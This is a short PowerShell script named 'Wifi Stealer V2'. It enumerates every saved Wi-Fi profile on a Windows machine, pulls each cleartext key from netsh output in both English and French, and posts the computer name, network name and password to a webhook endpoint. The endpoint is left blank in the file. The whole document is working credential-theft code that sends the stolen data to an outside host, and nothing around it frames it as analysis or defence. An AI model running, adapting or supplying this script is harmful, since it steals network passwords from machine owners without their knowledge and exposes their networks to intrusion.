
$webhookUri = ''
#Get List of SSIDS
$SSIDS = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+" | Where-Object {$_ -ne ""}

#A loop to get password for each SSID
$WifiInfo = foreach($SSID in $SSIDS) {
    # Check if output is in French or English
    $output = netsh wlan show profiles name=$SSID key=clear
	
	
	if ($output -match "Contenu de la clé"){
		
		$Password = ($output | Select-String 'Contenu de la clé') -replace ".*:\s+"
	}

	if ($output -match "Key Content"){
		
		$Password = ($output | Select-String 'Key Content') -replace ".*:\s+"
	}
	
	
    New-Object -TypeName psobject -Property @{"SSID"=$SSID;"Password"=$Password}
	


	
#Creating the body of your message
  $Body = @{
   'username' = 'Wifi Stealer V2'
   'content' = '**COMPUTER :**' + ' ' +   $env:computername + ' | **Network : **' + $SSID + ' | **Password :**   ' + $Password
   }
   
   
#Send your data using REST method
   Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
   
}